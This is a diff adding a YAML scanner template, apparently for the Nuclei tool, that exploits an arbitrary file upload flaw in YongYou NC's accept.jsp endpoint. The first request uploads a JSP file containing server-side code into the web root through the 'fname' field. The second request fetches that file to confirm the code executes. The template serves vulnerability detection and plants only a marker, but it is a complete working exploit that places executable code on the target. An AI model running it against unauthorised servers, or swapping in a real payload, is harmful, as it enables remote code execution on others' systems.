@@ -1,0 +1,49 @@
+id: poc-yaml-yong-you-nc-accept-jsp-anyfile-upload
+info:
+  name: YongYou NC accept.jsp Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alpha(4)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/aim/equipmap/accept.jsp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------16314487820932200903769468567"
+    body: |-
+      -----------------------------16314487820932200903769468567
+      Content-Disposition: form-data; name="upload"; filename="test.txt"
+      Content-Type: text/plain
+
+      <% out.println("{{t2}}"); %>
+      -----------------------------16314487820932200903769468567
+      Content-Disposition: form-data; name="fname"
+
+      \webapps\nc_web\{{t1}}.jsp
+      -----------------------------16314487820932200903769468567--
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, "The real file")
+          - contains(body, "parent.afterUpload(1)")
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, t2)
